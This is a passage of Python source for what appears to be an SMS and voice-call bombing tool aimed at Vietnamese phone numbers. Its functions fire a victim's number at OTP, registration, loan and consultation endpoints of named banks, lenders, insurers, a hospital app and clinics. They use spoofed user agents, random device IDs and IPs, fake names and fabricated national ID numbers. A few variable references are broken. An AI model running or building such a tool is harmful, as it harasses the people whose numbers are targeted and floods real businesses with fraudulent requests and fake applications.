        "app_name": "Mar Vay",
        "packagename": "com.maritme.assrt.vn",
        "platform": "android",
        "app_id": "266000001",
        "baseurl": "https://mvvii.marttimeassrt.com/",
        "weburl": "https://mvviw.marttimeassrt.com/",
        "logo": "assets/dialog/voice_phone.png",
    }
    try:
        response = await make_request(
            'POST',
            "https://mvvii.marttimeassrt.com/v3/login/captcha",
            json=payload,
            headers=headers,
        )
        print(f"CALL8 | -> OK [{res.status_code}] -> ")
    except Exception:
        print(f"CALL8 | ~> Lỗi ")

async def call9(phone):
    cookies = {
        "__sbref": "hgpyjywadlykgkoiavkyouqetxuxcpwhpxdqandf",
        "_cabinet_key": "SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDkxNDkwMTk2Ng.nD_8NLs-CZ7IqIV4JqSpmnAsPVAC0r0WuzMgua9OO1U",
    }
    headers_get = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "referer": "https://vayxanh.com/",
    }
    headers_post = {
        "accept": "application/json, text/plain, */*",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json;charset=utf-8",
        "origin": "https://lk.vayxanh.com",
        "referer": f"https://lk.vayxanh.com/?phone={phone}&amount=2000000&term=7",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "x-request-id": str(uuid.uuid4()),
    }
    try:
        resp_get = await make_request('GET',
            "https://lk.vayxanh.com/",
            params={
                "phone": phone,
                "amount": "2000000",
                "term": "7",
                "utm_source": "direct_vayxanh",
                "utm_medium": "organic",
                "utm_campaign": "direct_vayxanh",
                "utm_content": "mainpage_submit",
            },
            cookies=dict(cookies),
            headers=headers_get,
            timeout=10,
        )
        cookies.update(dict(resp_get.cookies))
        r = await make_request('POST',
            "https://lk.vayxanh.com/internal/client/otp/send",
            cookies=dict(cookies),
            headers=headers_post,
            json={"data": {"phone": phone, "code": "resend", "channel": "ivr"}},
            timeout=30,
        )
        print(f"CALL9 | -> OK [{r.status_code}] -> ")
    except Exception:
        print(f"CALL9 | ~> Lỗi ")


async def call3(phone):
    phone_formatted = phone.lstrip("0")
    url = "https://api.hicash.fun/v1/login/send/msm"
    headers = {
        "Host": "api.hicash.fun",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://h5.hicash.fun",
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "Referer": "https://h5.hicash.fun/",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Priority": "u=3, i",
    }
    data = {
        "phone": phone_formatted,
        "type": "2",
        "chntoken": "",
        "sourse": "1",
        "ip2": get_random_ip(),
        "ip3": get_random_ipv6(),
    }
    try:

        response = await make_request(
            'POST',
            url,
            headers=headers,
            data=data,
        )
        print(f"CALL3 | -> OK         ")
    except Exception:
        print(f"CALL3 | ~> Lỗi ")

_IOS_CFNETWORK = [
    ("1568.300.101", "24.2.0"),
    ("1568.200.51", "24.1.0"),
    ("1490.0.4", "23.6.0"),
    ("1490.0.4", "23.5.0"),
    ("1480.0.4", "23.4.0"),
]

def _vuiapp_headers(trace_id):
    device_id = str(uuid.uuid4()).upper()
    trace_id = uuid.uuid4().hex
    span_id = uuid.uuid4().hex[:16]
    cfnet, darwin = random.choice(_IOS_CFNETWORK)
    return {
        "Host": "api-vncdn.vuiapp.vn",
        "Accept": "*/*",
        "Accept-Language": "vi-VN",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "User-Agent": f"RNClientApp/20260507113653 CFNetwork/{cfnet} Darwin/{darwin}",
        "x-app-version": "4.39.70",
        "x-platform": "ios",
        "x-device-id": device_id,
        "x-format-money": "json",
        "x-debug-otp": "false",
        "sentry-trace": f"{trace_id}-{span_id}",
        "baggage": (
            "sentry-environment=production,"
            "sentry-release=vn.vuiapp.m%404.39.61%2B20260325125922,"
            "sentry-public_key=2001cef5546e49dc843c73b5edd45a9a,"
            f"sentry-trace_id={trace_id},"
            "sentry-org_id=402372"
        ),
    }

_VUIAPP_URL = 'https://api-vncdn.vuiapp.vn/graphql'

async def vuiapp_signup(phone):
    trace_id = uuid.uuid4().hex
    json_data = {
        "operationName": "getOtpChannel",
        "variables": {"phoneNumber": phone, "useCase": "signup"},
        "query": "query getOtpChannel($phoneNumber: PhoneNumber!, $useCase: String) {\n  otpResendOptions(phoneNumber: $phoneNumber, useCase: $useCase)\n}\n",
    }
    try:

        response = await make_request('POST', _VUIAPP_URL, headers=_vuiapp_headers(trace_id), json=json_data)
        print(f"VuiApp_Signup | -> OK -> ")
    except Exception:
        print(f"VuiApp_Signup | ~> Lỗi ")


async def vuiapp_signup_otp(phone):
    trace_id = uuid.uuid4().hex
    json_data = {
        "operationName": "resendAuthenticationOTP",
        "variables": {"payload": {"phoneNumber": phone, "otpLength": 6, "otpMethod": "Voice"}},
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
    }
    try:

        response = await make_request('POST', _VUIAPP_URL, headers=_vuiapp_headers(trace_id), json=json_data)
        print(f"VuiApp_Signup_OTP | -> OK -> ")
    except Exception:
        print(f"VuiApp_Signup_OTP | ~> Lỗi ")


async def vuiapp_forgot(phone):
    trace_id = uuid.uuid4().hex
    json_data = {
        "operationName": "getOtpChannel",
        "variables": {"phoneNumber": to_vn_intl_format(phone), "useCase": "forgotPassword"},
        "query": "query getOtpChannel($phoneNumber: PhoneNumber!, $useCase: String) {\n  otpResendOptions(phoneNumber: $phoneNumber, useCase: $useCase)\n}\n",
    }
    try:

        response = await make_request('POST', _VUIAPP_URL, headers=_vuiapp_headers(trace_id), json=json_data)
        print(f"VuiApp_Forgot | -> OK -> ")
    except Exception:
        print(f"VuiApp_Forgot | ~> Lỗi ")


async def vuiapp_forgot_otp(phone):
    trace_id = uuid.uuid4().hex
    json_data = {
        "operationName": "resendAuthenticationOTP",
        "variables": {"payload": {"phoneNumber": to_vn_intl_format(phone), "otpLength": 6, "otpMethod": "Voice"}},
        "query": "mutation resendAuthenticationOTP($payload: RequestResendOtpPayload!) {\n  requestResendOtp(payload: $payload) {\n    otp {\n      success\n      debug_otp\n      retryAfter\n      __typename\n    }\n    debug_otp\n    __typename\n  }\n}\n",
    }
    try:

        response = await make_request('POST', _VUIAPP_URL, headers=_vuiapp_headers(trace_id), json=json_data)
        print(f"VuiApp_Forgot_OTP | -> OK -> ")
    except Exception:
        print(f"VuiApp_Forgot_OTP | ~> Lỗi ")


async def aia_tuvan(phone):
    city_ids = [
        '97552944-f2b6-eb11-8236-002248173bb9',
        'a2552944-f2b6-eb11-8236-002248173bb9',
        'b5552944-f2b6-eb11-8236-002248173bb9',
        'c8552944-f2b6-eb11-8236-002248173bb9',
    ]
    product_types = [
        'life-protection-and-invest',
        'health-care',
        'accident-protection',
        'education-savings',
    ]
    dob_list = [
        '15 / 03 / 1990', '22 / 07 / 1985', '10 / 11 / 1992',
        '05 / 08 / 1988', '28 / 02 / 1995', '14 / 06 / 1983',
    ]
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'api-key': 'fbd2cc8c-857f-4329-8d13-627e7d1d8c02',
        'cache-control': 'no-cache, no-store, max-age=0, must-revalidate',
        'expires': '0',
        'pragma': 'no-cache',
        'Origin': 'https://www.aia.com.vn',
        'Referer': 'https://www.aia.com.vn/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    json_data = {
        'isExistingCustomer': 'no',
        'policyNumber': '',
        'name': random_vietnamese_name(),
        'phone': phone,
        'email': generate_email(),
        'dob': random.choice(dob_list),
        'gender': random.choice(['male', 'female']),
        'cityProvinceId': random.choice(city_ids),
        'productType': random.choice(product_types),
        'message': random.choice([
            'Yêu cầu tư vấn hỗ trợ',
            'Tôi muốn được tư vấn về bảo hiểm',
            'Cần tư vấn sản phẩm bảo hiểm phù hợp',
        ]),
        'lang': 'vi',
        'senderAgtCode': '',
        'senderStaffDept': '',
        'designation': '',
        'senderCompany': '',
        'senderEmailAIA': '',
    }
    try:

        response = await make_request('POST', 'https://apis.aia-apps.com/wise-api/api/contact-us', headers=headers, json=json_data)
        print(f"AIA_TUVAN | -> OK         ")
    except Exception:
        print(f"AIA_TUVAN | ~> Lỗi ")


async def odclick_tuvan(phone):
    import time as _time
    from urllib.parse import urlencode as _urlencode
    ts = int(_time.time() * 1000)
    headers = {
        'Accept': '*/*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Origin': 'https://odclick.com',
        'Referer': 'https://odclick.com/',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
        'X-Requested-With': 'XMLHttpRequest',
        'Accept-Language': 'vi-VN,vi;q=0.9',
    }
    inner_fields = _urlencode({
        'ak_hp_textarea': '',
        'ak_js': str(ts - random.randint(20000, 50000)),
        '__fluent_form_embded_post_id': '95',
        '_fluentform_19_fluentformnonce': '5077e36c37',
        '_wp_http_referer': '/',
        'input_text_1': random_vietnamese_name(),
        'dropdown_1': random.choice(['Chuyên viên', 'Quản lý', 'Quản lý cấp cao']),
        'dropdown': 'Tư vấn',
        'input_mask': phone,
        'email': generate_email(),
        'ak_bib': str(ts - random.randint(5000, 20000)),
        'ak_bfs': str(ts),
        'ak_bkpc': '42',
        'ak_bkp': '28;25,144',
    })
    try:

        response = await make_request('POST', 
            f'https://odclick.com/wp-admin/admin-ajax.php?t={ts}',
            headers=headers,
            data={'_tutor_nonce': 'f476a5bca1', 'data': inner_fields})
        print(f"ODCLICK_TUVAN | -> OK         ")
    except Exception:
        print(f"ODCLICK_TUVAN | ~> Lỗi ")


async def vtmoney(phone):
    cookies = {
        "_cfuvid": "IbrAhg9ruybk5tvcyo2YDibVieT0lAMzt5HRVyDkd8U-1748153577558-0.0.1.1-604800000",
    }

    headers = {
        "user-agent": "Viettel Money/8.8.28 (com.viettel.viettelpay; build:2; iOS 18.3.2) Alamofire/4.9.1",
        "host": "api8.viettelpay.vn",
        "content-type": "application/json",
        "accept": "*/*",
        "app-version": "8.8.28",
        "product": "VIETTELPAY",
        "type-os": "ios",
        "accept-encoding": "gzip;q=1.0, compress;q=0.5",
        "accept-language": "vi",
        "imei": "70B0EA3D-7FC0-45BA-8303-E83D802C004B",
        "device-name": "iPhone",
        "os-version": "18.3.2",
        "authority-party": "APP",
    }

    json_data = {
        "identityType": "msisdn",
        "type": "REGISTER",
        "identityValue": phone,
    }

    try:

        response = await make_request(
            'POST',
            "https://api8.viettelpay.vn/customer/v2/accounts/register",
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        print(f"VT_MONEY | -> OK         ")
    except Exception:
        print(f"VT_MONEY | ~> Lỗi ")


async def vtso(phone):
    cookies = {
        "ASP.NET_SessionId": "vo5etyjajtiy4ib2faw3znee",
        "Abp.Localization.CultureName": "vi",
        "__RequestVerificationToken": "0hb73fa4s9Aj0qDa5IGId09GuYCWZeXlNPtoEDHulaAhBnPSRIdgFK06D_87fHUUQjHndL8HWX817jTdiIBxNrKG7J6qaN4rR2tkcJzKmNI1",
        "XSRF-TOKEN": "zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1",
    }

    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-language": "vi,en-US;q=0.9,en;q=0.8,fr-FR;q=0.7,fr;q=0.6",
        "content-type": "application/json; charset=UTF-8",
        "origin": "https://gpp.com.vn",
        "referer": "https://gpp.com.vn/",
        "x-requested-with": "XMLHttpRequest",
        "x-xsrf-token": "zsAVl679RDMkWA0uDzuBL99OhxLdDbkd7j9JYrxrtJ484edCs9yGQqQyKsaSvvZsC4DNWrY4ZWLvvBA8EGAZ9UOWZNIhxnI0XjXZENRC3Jw1",
    }

    json_data = {
        "soDienThoai": phone,
    }

    try:

        response = await make_request(
            'POST',
            "https://gpp.com.vn/account/LayMaXacThucDangKyTaiKhoan",
            cookies=cookies,
            headers=headers,
            json=json_data,
        )
        print(f"VTSO_GPP | -> OK         ")
    except Exception:
        print(f"VTSO_GPP | ~> Lỗi ")


async def shbfinance(phone):
    import time as _time
    ts = int(_time.time() * 1000)
    tran_id = f"{ts}-{random.randint(100, 999)}"
    now_str = _time.strftime("%d/%m/%Y %H:%M:%S")
    now_iso = _time.strftime("%Y-%m-%d %H:%M:%S")
    device_id = f"Safari_{ts - random.randint(100000, 500000)}"
    user_id   = "".join(random.choices(string.digits, k=12))
    _cccd = (
    f"0310"
    f"{random.randint(0,99):02d}"
    f"0"
    f"{random.randint(0,99):02d}"
    f"1"
    f"{random.randint(0,99):02d}"
    )
    base_headers = {
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "origin": "https://www.shbfinance.com.vn",
        "referer": "https://www.shbfinance.com.vn/",
        "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
        "accept-language": "vi-VN,vi;q=0.9",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
    }
    # Bước 1: generate-checksum
    checksum_data = {
        "timestamp": ts,
        "providerId": "WEB",
        "request": {
            "deviceId": device_id,
            "latitude": 0,
            "longitude": 0,
            "deviceName": "website browser",
            "deviceModel": "browser",
            "deviceType": "Website",
            "deviceVersion": "website browser",
            "modelMobile": "Website",
            "osMobile": "Website",
            "verAppMobile": "1.0.0",
            "userId": user_id,
            "consentStep": "Đăng ký vay trên Web",
            "consentType": "T&C và quyền riêng tư, NĐ 13 (T&C REGISTER)",
            "consentNotification": "Bằng việc click vào 'Đăng ký nhanh', Tôi đồng ý với Điều khoản điều kiện sử dụng dịch vụ Online banking và Bảo vệ dữ liệu cá nhân và bảo mật thông tin của SHBFinance và đồng ý nhận cuộc gọi giới thiệu sản phẩm, dịch vụ của SHBFinance từ 08h đến 20h",
            "consentVersion": "Ver 01/2025",
            "consentChannel": "Web",
            "legalBase": "Cir50/2024",
            "consentTimestamp": now_iso,
            "deviceIdentifier": "Website",
            "operatingSystem": "Website",
            "appVersion": "1.0.0",
        },
    }

    checksum = ""
    try:
        r_cs, _ = await _req(
            'POST',
            "https://www.shbfinance.com.vn/api/generate-checksum",
            headers={**base_headers, "accept": "*/*"},
            json=checksum_data,
        )
        checksum = r_cs.json().get("checksum", "")
    except Exception:
        pass
    # Bước 2: submitFormLoan
    loan_data = {
        "recaptchaToken": "",
        "tranId": tran_id,
        "customerName": random_vietnamese_name(),
        "idCardNumber": _cccd, 
        "mobile": phone,
        "loanAmount": random.choice([10000000, 15000000, 20000000, 30000000]),
        "loanTerm": random.choice([12, 24, 36, 48]),
        "emi": random.randint(300000, 600000),
        "createDate": now_str,
        "deviceType": "mobile",
        "os": "iOS",
        "browser": "Safari",
        "browserVersion": "18.1",
        "language": "vi-VN",
        "timeZone": "Asia/Saigon",
        "campaignCode": "",
        "url": "/",
        "clickId": None,
        "referralCode": None,
        "utmSource": "",
        "utmMedium": "",
        "utmCampaign": "",
        "utmContent": "",
        "utmTerm": "",
        "utmId": "",
        "checksum": checksum,
    }

    try:

        response = await make_request(
            'POST',
            "https://www.shbfinance.com.vn/api/submitFormLoan",
            headers=base_headers,
            json=loan_data,
        )
        print(f"SHBFINANCE | -> OK         ")
    except Exception:
        print(f"SHBFINANCE | ~> Lỗi ")


async def abond(phone):
    headers = {
        "Content-Type": "application/json",
        "Connection": "keep-alive",
        "Accept": "application/json",
        "User-Agent": "abond/15 CFNetwork/1568.200.51 Darwin/24.1.0",
        "Accept-Language": "vi-VN,vi;q=0.9",
        "Accept-Encoding": "gzip, deflate",
    }

    json_data = {
        "UserName": phone,
    }

    try:

        response = await make_request(
            'POST',
            "http://api-abond.apecgroup.net/api/auth/sendotp?token",
            headers=headers,
            json=json_data,
        )
        print(f"ABOND_APEC | -> OK         ")
    except Exception:
        print(f"ABOND_APEC | ~> Lỗi ")


async def vinasun_register(phone):
    phone84 = '84' + phone[1:]
    ts = str(int(time.time()))
    udid = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    ho = random.choice(['Nguyễn','Trần','Lê','Phạm','Hoàng','Phan','Vũ','Đặng','Bùi','Đỗ'])
    ten = random.choice(['Minh','Hùng','Lan','Hoa','Tuấn','Nam','Linh','Anh','Hải','Dung','Mai','Trang'])
    name = f"{ho} {ten}"
    headers = {
        'Accept': '*/*',
        'Version': '248',
        'OS': '1',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip',
        'Content-Type': 'application/json',
        'User-Agent': 'Vinasun/248 CFNetwork/1568.200.51 Darwin/24.1.0',
        'apisig': 'z1ML_B0T_xhDCcZ7V6jFPce4WVpliHDqYcuvFhYlI48',
        'ts': ts,
        'Cookie': 's=',
        'UDID': udid,
    }
    json_data = {
        'UserName': name,
        'Email': generate_email(),
        'Mobile': phone84,
        'Password': 'Trong@288',
        'RegionID': -1,
    }
    try:

        response = await make_request('POST', 'https://vnspassengerapi.hungdat.vn/api/passenger/Register', headers=headers, json=json_data)
        print(f"VINASUN_REG | -> OK         ")
    except Exception:
        print(f"VINASUN_REG | ~> Lỗi ")


async def lottefinance(phone):
    identity = (
    f"0310"
    f"{random.randint(0,99):02d}"
    f"0"
    f"{random.randint(0,99):02d}"
    f"1"
    f"{random.randint(0,99):02d}"
    )
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Accept-Encoding': 'gzip, deflate, br',
    }
    json_data = {
        'login': identity,
        'phoneNumber': phone,
        'identityNumber': identity,
        'changeRequired': True,
        'email': generate_email(),
    }
    try:

        response = await make_request('POST', 'https://digital.lottefinance.vn/lfd-api/api/account/register', headers=headers, json=json_data)
        print(f"LOTTEFINANCE | -> OK         ")
    except Exception:
        print(f"LOTTEFINANCE | ~> Lỗi ")


async def isofhcare_nhidong(phone):
    import hashlib as _hl
    device_id = '-'.join([
        ''.join(random.choices(string.hexdigits.upper(), k=8)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=4)),
        ''.join(random.choices(string.hexdigits.upper(), k=12)),
    ])
    headers = {
        'devicetype': 'mobile',
        'Accept': 'application/json, text/plain, */*',
        'appversion': '10.0.116',
        'source': 'nhidongthanhpho',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'vi-VN,vi;',
        'deviceos': 'ios 18.1',
        'Content-Type': 'application/json',
        'deviceid': device_id,
        'User-Agent': 'BenhVienNhiDong/116 CFNetwork/1568.200.51 Darwin/24.1.0',
        'mobilemode': 'user',
    }
    json_data = {
        'user': {
            'name': '',
            'password': 'Trong@288',
            'role': 1,
            'telephoneNumber': {
                'number': phone,
                'dialingCode': '+84',
            },
        },
        'isofhcareCode': '',
        'socialType': 1,
    }
    try:

        response = await make_request('POST', 'https://api-produce.isofhcare.com/isofhcare/user/register', headers=headers, json=json_data)
        print(f"ISOFHCARE_NHIDONG | -> OK         ")
    except Exception:
        print(f"ISOFHCARE_NHIDONG | ~> Lỗi ")


async def nhakhoaquoctevietphap_datlich(phone):
    import re as _re, json as _json
    _ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1'
    _hdrs_get = {
        'User-Agent': _ua,
        'Accept': 'text/html,application/xhtml+xml,*/*;q=0.8',
        'Accept-Language': 'vi-VN,vi;q=0.9',
        'Referer': 'https://www.google.com/',
    }
    _cau_hoi = [
        'Tôi bị đau răng, muốn đặt lịch khám sớm.',
        'Răng khôn mọc lệch, cần tư vấn nhổ.',
        'Muốn tẩy trắng răng, chi phí bao nhiêu?',
        'Trẻ em 7 tuổi bị sâu răng, cần điều trị.',
        'Cần trám răng, có lịch hẹn không?',
        'Bị ê buốt răng sau khi ăn đồ lạnh.',
        'Muốn niềng răng, tư vấn loại phù hợp.',
        'Răng bị gãy, cần bọc sứ.',
        'Muốn cấy implant, giá cả thế nào?',
        'Nướu bị chảy máu khi đánh răng.',
    ]
    _urls = [
        'https://nhakhoaquoctevietphap.vn/trong-rang/',
        'https://nhakhoaquoctevietphap.vn/kien-thuc/trong-rang/trong-rang-ham-so-6-gia-bao-nhieu.html',
        'https://nhakhoaquoctevietphap.vn/nho-rang-khon/',
        'https://nhakhoaquoctevietphap.vn/tay-trang-rang/',
        'https://nhakhoaquoctevietphap.vn/',
    ]
    try:

        response = await make_request('GET', 'https://nhakhoaquoctevietphap.vn/',
            headers=_hdrs_get)
        nonce = (_re.search(r'security[^a-z0-9"\x27]*["\x27]([a-f0-9]{10})', r.text) or [None, '61733b60de'])[1]
    except Exception:
        nonce = '61733b60de'
    _name = random_vietnamese_name()
    _url  = random.choice(_urls)
    _q    = random.choice(_cau_hoi)
    _form_data_obj = {
        "id": "3",
        "fields": {
            "11": {"value": _name, "id": 11},
            "12": {"value": phone, "id": 12},
            "13": {"value": _q, "id": 13},
            "14": {"value": "", "id": 14},
            "55": {"value": "", "id": 55},
            "56": {"value": "", "id": 56},
            "59": {"value": _url, "id": 59},
            "60": {"value": "", "id": 60},
        },
        "settings": {"objectType": "Form Setting", "editActive": True},
        "extra": {},
    }
    try:

        response = await make_request('POST', 'https://nhakhoaquoctevietphap.vn/wp-admin/admin-ajax.php',
            headers={
                'User-Agent': _ua,
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Accept': '*/*',
                'Origin': 'https://nhakhoaquoctevietphap.vn',
                'Referer': 'https://nhakhoaquoctevietphap.vn/',
                'Accept-Language': 'vi-VN,vi;q=0.9',
            },
            data={
                'lang': 'vi',
                'action': 'nf_ajax_submit',
                'security': nonce,
                'formData': _json.dumps(_form_data_obj, ensure_ascii=False),
            },
        )
        print(f"NHAKHOA_VP | -> OK -> ")
    except Exception:
        print(f"NHAKHOA_VP | ~> Lỗi ")


async def seabankasset(phone):
    import uuid as _uuid
    device_id = _uuid.uuid4().hex  # 32-char hex, không có dấu -
    try:

        response = await make_request('POST', 'http://lend.seabankassetcompany.com/base/xmh/getSMSCode',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'i18n': 'hi_IN',
                'reqSource': 'Ios',
                'ownerShip': 'sealend_ios',
                'encrypted': '0',
                'encryptType': '1',
                'disturbedUrl': '1',
                'disturbedPar': '1',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Origin': 'http://h5.seabankassetcompany.com',
                'Referer': 'http://h5.seabankassetcompany.com/h5',
            },
            json={
                'i18n': 'hi_IN',
                'reqSource': 'Ios',
                'phoneName': '',
                'appVersion': '1.0.0',
                'androidversion': 'iPhone18.1',
                'webVersion': 'H5_A',
                'deviceID': device_id,
                'pagingData': 0,
                'exquisiteItemType': 1,
                'ownerShip': 'sealend_ios',
                'uuid': '',
                'token': '',
                'phoneNo': phone,
                'veriType': 'LOGIN',
                'figureVeri': '',
            },
        )
        print(f"SEABANKASSET | -> OK -> ")
    except Exception:
        print(f"SEABANKASSET | ~> Lỗi ")


async def tima(phone):
    try:

        response = await make_request('POST', 'https://gwmy.tima.vn/api/User/Register',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'User-Agent': 'MyTima/1 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
            },
            json={'mobile': phone},
        )
        print(f"TIMA | -> OK -> ")
    except Exception:
        print(f"TIMA | ~> Lỗi ")


async def tima_check_phone_exists(phone):
    try:

        response = await make_request('GET', 'https://paygate.tima.vn/api/security/check_phone_exists',
            params={'mobile': phone},
            headers={
                'Accept': 'application/json',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'User-Agent': 'TimaInvestor/1 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Encoding': 'gzip, deflate, br',
            },
        )
        print(f"TIMA_CHECK_PHONE | -> OK -> ")
    except Exception:
        print(f"TIMA_CHECK_PHONE | ~> Lỗi ")


async def tima_lender_register(phone):
    try:

        response = await make_request('POST', 'https://tima.vn/Lender/Register',
            headers={
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Origin': 'https://tima.vn',
                'Referer': 'https://tima.vn/Lender/Register',
            },
            data={
                'fullName': random_vietnamese_name(),
                'phone': phone,
                'email': generate_email(),
                'phone_ref': '',
            },
        )
        print(f"TIMA_LENDER_REGISTER | -> OK -> ")
    except Exception:
        print(f"TIMA_LENDER_REGISTER | ~> Lỗi ")


async def tima_aff_get_otp(phone):
    try:

        response = await make_request('GET', 'http://103.35.65.57:8010/api/v1.0/Users/get_otp',
            params={'phone': phone},
            headers={
                'Accept': 'application/json',
                'User-Agent': 'TimaAFF/1 CFNetwork/1568.200.51 Darwin/24.1.0',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
            },
        )
        print(f"TIMA_AFF_OTP | -> OK -> ")
    except Exception:
        print(f"TIMA_AFF_OTP | ~> Lỗi ")


async def mafc(phone):
    identity = (
    f"0310"
    f"{random.randint(0,99):02d}"
    f"0"
    f"{random.randint(0,99):02d}"
    f"1"
    f"{random.randint(0,99):02d}"
    )        

    try:

        response = await make_request('POST', 
            'https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/apitouch.php',
            headers={
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Origin': 'https://mafc.com.vn',
                'Referer': 'https://mafc.com.vn/',
            },
            json={
                'phoneNumber': phone,
                'nationalId': identity,
                'vendorCode': 'INTERNAL_MKT',
                'channel': 'LDP',
            },
        )
        print(f"MAFC | -> OK -> ")
    except Exception:
        print(f"MAFC | ~> Lỗi ")


async def seaoffers(phone):
    name = random_vietnamese_name()
    SERVICES = [
    "Tài khoản kinh doanh số đẹp",
    "Tài khoản thanh toán",
    "Thẻ ghi nợ",
    "Internet Banking",
    "Mobile Banking",
    "SMS Banking",
    "QR Pay",
    "Tài khoản doanh nghiệp",
]
    _services = random.sample(SERVICES, k=random.randint(1, 3))
    try:

        response = await make_request('POST', 
            'https://seaoffers.seabank.com.vn/goi-giai-phap-toan-dien-ho-kinh-doanh/save-xml.php',
            headers={
                'Content-Type': 'application/json',
                'Accept': '*/*',
                'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1',
                'Accept-Language': 'vi-VN,vi;q=0.9',
                'Origin': 'https://seaoffers.seabank.com.vn',
                'Referer': 'https://seaoffers.seabank.com.vn/',
            },
            json={
                'name': name,
                'phone': phone,
                'cccd': 'Thanh xuân',
                'dkkd': 'Hanoi',
                'services': _services,
                'utm_source': 'gg',
                'gclid': 'EAIaIQobChMIyeC9vLzDlQMVAMJMAh1jJhdSEAAYASAAEgLG2PD_BwE',
                'fbclid': '',
            },
        )
        print(f"SeaOffers | -> OK -> ")
    except Exception:
